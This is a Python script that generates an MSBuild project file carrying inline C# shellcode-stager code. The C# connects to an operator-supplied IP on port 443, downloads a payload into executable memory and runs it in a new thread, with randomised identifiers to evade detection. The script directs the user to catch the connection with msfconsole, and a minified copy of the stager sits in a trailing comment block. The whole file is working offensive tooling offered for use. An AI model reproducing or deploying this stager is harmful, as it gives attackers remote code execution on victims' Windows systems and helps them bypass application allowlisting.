#!/usr/bin/env python3

import os
import sys

def main():
    ip = input("[*] Enter your IP: ")

    outfile = open("mspayload_nps.xml", "w")

    outfile.write(
        """
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe mspayload_nps.xml -->
<Target Name="TGaywVtZz">
    <yymnTWKasHV />
</Target>
<UsingTask
    TaskName="yymnTWKasHV"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
        <Code Type="Class" Language="cs">
            <![CDATA[
                using System;
                using System.Net;
                using System.Net.Sockets;
                using System.Linq;
                using System.Runtime.InteropServices;
                using System.Threading;
                using Microsoft.Build.Framework;
                using Microsoft.Build.Utilities;

                public class yymnTWKasHV: Task, ITask {
                 [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 FZzLxk, UInt32 GaYMcefbEK, UInt32 GFGltjlHN, UInt32 rUfXcRhhWyT);
                 [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 EEKWyVg, UInt32 DCQjzDiQ, UInt32 yUAshCNzdWWyiuX, IntPtr qcoQmEAsCYVxJN, UInt32 cwTzTaaIonmPyx, ref UInt32 NIQSzWsYXEXJ);
                 [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr ghbDXrzbbkU, UInt32 JRLCRpITaqhthxo);

                 static byte[] XLiKrUiHVLg(string MWGKqRcvxKiCxsD, int WfkhTLYBl) {
                  IPEndPoint AljjdKQhXFar = new IPEndPoint(IPAddress.Parse(MWGKqRcvxKiCxsD), WfkhTLYBl);
                  Socket AOjJkaknaCLabUb = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                  try {
                   AOjJkaknaCLabUb.Connect(AljjdKQhXFar);
                  } catch {
                   return null;
                  }

                  byte[] mdoldF = new byte[4];
                  AOjJkaknaCLabUb.Receive(mdoldF, 4, 0);
                  int MgAnjUozvMDSsv = BitConverter.ToInt32(mdoldF, 0);
                  byte[] KCEwzCyVtln = new byte[MgAnjUozvMDSsv + 5];
                  int fjlRsQatOOXVF = 0;

                  while (fjlRsQatOOXVF < MgAnjUozvMDSsv) {
                   fjlRsQatOOXVF += AOjJkaknaCLabUb.Receive(KCEwzCyVtln, fjlRsQatOOXVF + 5, (MgAnjUozvMDSsv - fjlRsQatOOXVF) < 4096 ? (MgAnjUozvMDSsv - fjlRsQatOOXVF) : 4096, 0);
                  }

                  byte[] HUDMCDCGhunIblU = BitConverter.GetBytes((int) AOjJkaknaCLabUb.Handle);
                  Array.Copy(HUDMCDCGhunIblU, 0, KCEwzCyVtln, 1, 4);
                  KCEwzCyVtln[0] = 0xBF;
                  return KCEwzCyVtln;
                 }

                 static void xxtKMgGJV(byte[] jLKRseom) {
                  if (jLKRseom != null) {
                   UInt32 XewKEzI = VirtualAlloc(0, (UInt32) jLKRseom.Length, 0x1000, 0x40);
                   Marshal.Copy(jLKRseom, 0, (IntPtr)(XewKEzI), jLKRseom.Length);
                   IntPtr FGAnYqQsIBfSRGz = IntPtr.Zero;
                   UInt32 APoDWpuRSVvZO = 0;
                   IntPtr GHFmTAQDl = IntPtr.Zero;
                   FGAnYqQsIBfSRGz = CreateThread(0, 0, XewKEzI, GHFmTAQDl, 0, ref APoDWpuRSVvZO);
                   WaitForSingleObject(FGAnYqQsIBfSRGz, 0xFFFFFFFF);
                  }
                 }

                 public override bool Execute() {
                  byte[] vKluxGThzSA = null;
                  vKluxGThzSA = XLiKrUiHVLg("%s", 443);
                  xxtKMgGJV(vKluxGThzSA);
                  return true;
                 }
                }
            ]]>
        </Code>
    </Task>
</UsingTask>
</Project>

        """
        % ip)

    print("[+] File saved, %s:443 used." % ip)
    print("[*] Use msfconsole to setup your listener.")
    print("[*] Done!")

    sys.exit(0)

if __name__ == '__main__':
    main()

# Debug notes below + stuff to be implemented.

"""

using System;using System.Net;using System.Net.Sockets;using System.Linq;using System.Runtime.InteropServices;using System.Threading;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class yymnTWKasHV:Task,ITask{[DllImport("kernel32")]private static extern UInt32 VirtualAlloc(UInt32 FZzLxk,UInt32 GaYMcefbEK,UInt32 GFGltjlHN,UInt32 rUfXcRhhWyT);[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 EEKWyVg,UInt32 DCQjzDiQ,UInt32 yUAshCNzdWWyiuX,IntPtr qcoQmEAsCYVxJN,UInt32 cwTzTaaIonmPyx,ref UInt32 NIQSzWsYXEXJ);[DllImport("kernel32")]private static extern UInt32 WaitForSingleObject(IntPtr ghbDXrzbbkU,UInt32 JRLCRpITaqhthxo);static byte[]XLiKrUiHVLg(string MWGKqRcvxKiCxsD,int WfkhTLYBl){IPEndPoint AljjdKQhXFar=new IPEndPoint(IPAddress.Parse(MWGKqRcvxKiCxsD),WfkhTLYBl);Socket AOjJkaknaCLabUb=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);try{AOjJkaknaCLabUb.Connect(AljjdKQhXFar);}
catch{return null;}
byte[]mdoldF=new byte[4];AOjJkaknaCLabUb.Receive(mdoldF,4,0);int MgAnjUozvMDSsv=BitConverter.ToInt32(mdoldF,0);byte[]KCEwzCyVtln=new byte[MgAnjUozvMDSsv+5];int fjlRsQatOOXVF=0;while(fjlRsQatOOXVF<MgAnjUozvMDSsv){fjlRsQatOOXVF+=AOjJkaknaCLabUb.Receive(KCEwzCyVtln,fjlRsQatOOXVF+5,(MgAnjUozvMDSsv-fjlRsQatOOXVF)<4096?(MgAnjUozvMDSsv-fjlRsQatOOXVF):4096,0);}
byte[]HUDMCDCGhunIblU=BitConverter.GetBytes((int)AOjJkaknaCLabUb.Handle);Array.Copy(HUDMCDCGhunIblU,0,KCEwzCyVtln,1,4);KCEwzCyVtln[0]=0xBF;return KCEwzCyVtln;}
static void xxtKMgGJV(byte[]jLKRseom){if(jLKRseom!=null){UInt32 XewKEzI=VirtualAlloc(0,(UInt32)jLKRseom.Length,0x1000,0x40);Marshal.Copy(jLKRseom,0,(IntPtr)(XewKEzI),jLKRseom.Length);IntPtr FGAnYqQsIBfSRGz=IntPtr.Zero;UInt32 APoDWpuRSVvZO=0;IntPtr GHFmTAQDl=IntPtr.Zero;FGAnYqQsIBfSRGz=CreateThread(0,0,XewKEzI,GHFmTAQDl,0,ref APoDWpuRSVvZO);WaitForSingleObject(FGAnYqQsIBfSRGz,0xFFFFFFFF);}}
public override bool Execute(){byte[]vKluxGThzSA=null;vKluxGThzSA=XLiKrUiHVLg("%s",443);xxtKMgGJV(vKluxGThzSA);return true;}}

"""
